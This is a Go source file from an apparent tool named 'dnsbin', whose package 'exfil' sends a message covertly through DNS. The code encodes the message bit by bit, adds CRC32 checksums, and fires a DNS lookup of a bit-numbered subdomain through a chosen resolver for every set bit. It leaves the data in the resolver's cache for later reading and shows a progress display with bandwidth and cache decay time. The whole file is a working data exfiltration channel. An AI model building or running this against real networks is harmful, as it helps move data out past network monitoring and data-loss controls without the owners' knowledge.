package exfil

import (
	"dnsbin/config"
	"dnsbin/utils"
	"encoding/binary"
	"fmt"
	"hash/crc32"
	"strings"
	"sync"
	"time"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
	"github.com/google/uuid"
)

type bitSentMsg int
type statsReadyMsg struct{}

type sendModel struct {
	cfg          config.Config
	shortUUID    string
	fullData     []byte
	sentBits     []bool
	totalBits    int
	bitsFinished int
	startTime    time.Time
	endTime      time.Time
	decayTime    time.Duration
	done         bool
	width        int
}

func (m *sendModel) Init() tea.Cmd {
	return nil
}

func (m *sendModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	switch msg := msg.(type) {
	case tea.WindowSizeMsg:
		m.width = msg.Width
	case bitSentMsg:
		pos := int(msg)
		if pos >= 0 && pos < len(m.sentBits) {
			m.sentBits[pos] = true
			m.bitsFinished++
		}
		if m.bitsFinished == m.totalBits {
			// Wait for statsReadyMsg instead of quitting here
		}
	case statsReadyMsg:
		m.done = true
		return m, tea.Quit
	case tea.KeyMsg:
		if msg.String() == "ctrl+c" || msg.String() == "q" {
			return m, tea.Quit
		}
	}
	return m, nil
}

func (m *sendModel) View() string {
	var b strings.Builder
	b.WriteString(fmt.Sprintf("\n[+] Using UUID: %s\n", lipgloss.NewStyle().Foreground(lipgloss.Color("10")).Render(m.shortUUID)))
	b.WriteString(fmt.Sprintf("[+] Message length: %d bytes\n\n", len(m.fullData)-3))

	crcEnabled := (m.cfg.Options & (1 << 2)) != 0
	currentLineLen := 0
	
	// We need to skip CRC bytes in the view
	dataIdx := 3
	bytesDisplayed := 0
	expectedLen := int(binary.BigEndian.Uint16(m.fullData[1:3]))

	if crcEnabled {
		numBlocks := (expectedLen + 255) / 256
		dataIdx += numBlocks * 4 // Skip all CRC bytes at the beginning
	}

	for dataIdx < len(m.fullData) && bytesDisplayed < expectedLen {
		if true {
			bytesDisplayed++
			allBitsSent := true
			for j := 0; j < 8; j++ {
				bitPos := dataIdx*8 + j
				if bitPos >= len(m.sentBits) || !m.sentBits[bitPos] {
					allBitsSent = false
					break
				}
			}

			charStr := ""
			if allBitsSent {
				charStr = string(m.fullData[dataIdx])
			} else {
				charStr = lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render("░")
			}

			if m.width > 0 && currentLineLen >= m.width-1 {
				b.WriteString("\n")
				currentLineLen = 0
			}
			b.WriteString(charStr)
			currentLineLen++
		}
		dataIdx++
	}

	b.WriteString(fmt.Sprintf("\n\nProgress: %d/%d bits triggered\n", m.bitsFinished, m.totalBits))
	if m.done {
		b.WriteString(lipgloss.NewStyle().Foreground(lipgloss.Color("10")).Render("\n[+] Done!\n"))

		duration := m.endTime.Sub(m.startTime)
		bytesPerSec := float64(len(m.fullData)) / duration.Seconds()

		b.WriteString("\nTransmission Statistics:\n")
		b.WriteString(fmt.Sprintf("  Time Taken:    %.1fs\n", duration.Seconds()))
		b.WriteString(fmt.Sprintf("  Bandwidth:     %.1f bytes/s\n", bytesPerSec))
		
		h := int(m.decayTime.Hours())
		m_ := int(m.decayTime.Minutes()) % 60
		s := int(m.decayTime.Seconds()) % 60
		b.WriteString(fmt.Sprintf("  Decay Time:    %dh %dm %ds (Remaining in resolver cache)\n", h, m_, s))
	}
	return b.String()
}

func Send(cfg config.Config, message string) {
	u := uuid.New().String()
	shortUUID := strings.Split(u, "-")[0]

	msgBytes := []byte(message)
	msgLen := uint16(len(msgBytes))
	options := cfg.Options
	header := []byte{options, byte(msgLen >> 8), byte(msgLen & 0xff)}

	var fullData []byte
	fullData = append(fullData, header...)

	crcEnabled := (options & (1 << 2)) != 0
	if crcEnabled {
		blockSize := 256
		var checksums []byte
		for i := 0; i < len(msgBytes); i += blockSize {
			end := i + blockSize
			if end > len(msgBytes) {
				end = len(msgBytes)
			}
			chunk := msgBytes[i:end]
			
			checksum := crc32.ChecksumIEEE(chunk)
			csBytes := make([]byte, 4)
			binary.BigEndian.PutUint32(csBytes, checksum)
			checksums = append(checksums, csBytes...)
		}
		fullData = append(fullData, checksums...)
		fullData = append(fullData, msgBytes...)
	} else {
		fullData = append(fullData, msgBytes...)
	}

	totalBits := len(fullData) * 8
	m := &sendModel{
		cfg:       cfg,
		shortUUID: shortUUID,
		fullData:  fullData,
		sentBits:  make([]bool, totalBits),
		totalBits: totalBits,
		startTime: time.Now(),
	}

	p := tea.NewProgram(m)

	go func() {
		var wg sync.WaitGroup
		sem := make(chan struct{}, cfg.Concurrency)

		for i, b := range fullData {
			bits := fmt.Sprintf("%08b", b)
			for bitIdx, bit := range bits {
				bitPos := i*8 + bitIdx
				if bit == '0' {
					p.Send(bitSentMsg(bitPos))
					continue
				}

				wg.Add(1)
				go func(pos int) {
					defer wg.Done()
					sem <- struct{}{}
					defer func() { <-sem }()

					query := fmt.Sprintf("%d.%s.%s", pos, shortUUID, cfg.Domain)
					utils.TriggerQuery(query, cfg.Resolver)
					p.Send(bitSentMsg(pos))
				}(bitPos)
			}
		}
		wg.Wait()
		m.endTime = time.Now()

		endQuery := fmt.Sprintf("end.%s.%s", shortUUID, cfg.Domain)
		utils.TriggerQuery(endQuery, cfg.Resolver)
		
		// To find the lowest TTL (first bit to expire), we check the first '1' bit sent
		firstOnePos := -1
		for i, b := range fullData {
			bits := fmt.Sprintf("%08b", b)
			for bitIdx, bit := range bits {
				if bit == '1' {
					firstOnePos = i*8 + bitIdx
					break
				}
			}
			if firstOnePos != -1 { break }
		}

		if firstOnePos != -1 {
			query := fmt.Sprintf("%d.%s.%s", firstOnePos, shortUUID, cfg.Domain)
			if ttl, err := utils.QueryTTL(query, cfg.Resolver); err == nil {
				m.decayTime = time.Duration(ttl) * time.Second
			}
		} else {
			// Fallback to end marker if no '1' bits (unlikely for real data)
			if ttl, err := utils.QueryTTL(endQuery, cfg.Resolver); err == nil {
				m.decayTime = time.Duration(ttl) * time.Second
			}
		}
		p.Send(statsReadyMsg{})
	}()

	if _, err := p.Run(); err != nil {
		fmt.Printf("Error running program: %v", err)
	}
}